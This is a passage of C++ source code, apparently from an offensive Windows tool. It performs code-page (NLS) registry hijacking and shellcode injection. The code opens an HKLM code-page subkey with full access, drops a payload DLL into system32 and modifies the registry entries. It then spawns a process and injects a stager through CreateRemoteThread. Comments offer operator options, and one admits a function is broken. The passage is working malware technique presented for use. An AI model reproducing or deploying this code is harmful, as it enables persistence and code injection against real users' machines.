		std::printf("Could not change protection of memory for shellcode injection. Last error is 0x%x\n", GetLastError());
		return;
	}
	HANDLE hThread = CreateRemoteThread(regObject->m_procInfo.hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShellcodeMemory, lpCodePageID, 0, nullptr);
	if (hThread == INVALID_HANDLE_VALUE) {
		std::printf("Could not open a handle to the payload .exe\n");
		return;
	}
}

bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
{
	bool bResult = false; 

	//Open handle to registry key.
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regObject->getStringBuffer(Index::SUBKEY_KEY_VALUE),
		0, KEY_ALL_ACCESS, &regObject->hSubkeyNls) != EXIT_SUCCESS)
	{
		std::printf("Could not open handle to subkey of codePage!, LastError [0x%x]\n", GetLastError());
		return bResult;
	}
	//Check Dll has been dropped in system32, you can change this to Temp directory if you want.
	if (!DropSystemDllPayload(regObject)) {
		std::printf("Payload dll has been failed to drop main payload \n");
		return bResult;
	}
	//Fix this funcion, its fucking it up, the code inside the registry key is fucking it up
	if (!IterateCodePageAndExtractProperId(regObject)){
		std::printf("Could not iterate key for proper modification. Last error: [0x%x]\n", GetLastError());
		return bResult;
	}
	
	if (CreateProcessToInject(&regObject->m_procInfo))
	{
		InjectStagerToPayload(regObject);
		bResult = true;
	}

	return bResult;
}